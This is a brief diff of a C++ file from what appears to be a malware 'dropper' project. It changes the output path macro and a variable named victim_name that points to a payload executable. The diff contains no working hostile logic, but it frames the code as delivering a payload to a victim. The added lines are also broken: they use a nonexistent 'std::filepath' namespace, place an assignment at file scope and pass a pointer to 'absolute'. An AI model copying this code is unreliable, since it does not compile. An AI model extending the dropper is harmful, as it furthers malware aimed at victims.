@@ -14,7 +14,7 @@
 #endif
 
 #ifndef DROPPER_OUTPUT
-#define DROPPER_OUTPUT "/home/adi/Downloads/Walmart-version-of-Dropper/Linux_mint_22.3/FileSystem_exe_rebuild.exe"
+#define DROPPER_OUTPUT "FileSystem_exe_rebuild/FileSystem_exe_rebuild.exe"
 #endif
 
 #include<iostream>
@@ -60,7 +60,9 @@ void set_name();
 char name[10 * NAME_SIZE];
 
 // (char*) C:\\example\\path\\to\\your\\payload.exe
-char* victim_name = DROPPER_OUTPUT;
+std::filepath::path victim_name = DROPPER_OUTPUT;
+
+victim_name = std::filepath::absolute(&victim_name);
 
 // Entry Point
 int main(int argc, char* argv[])
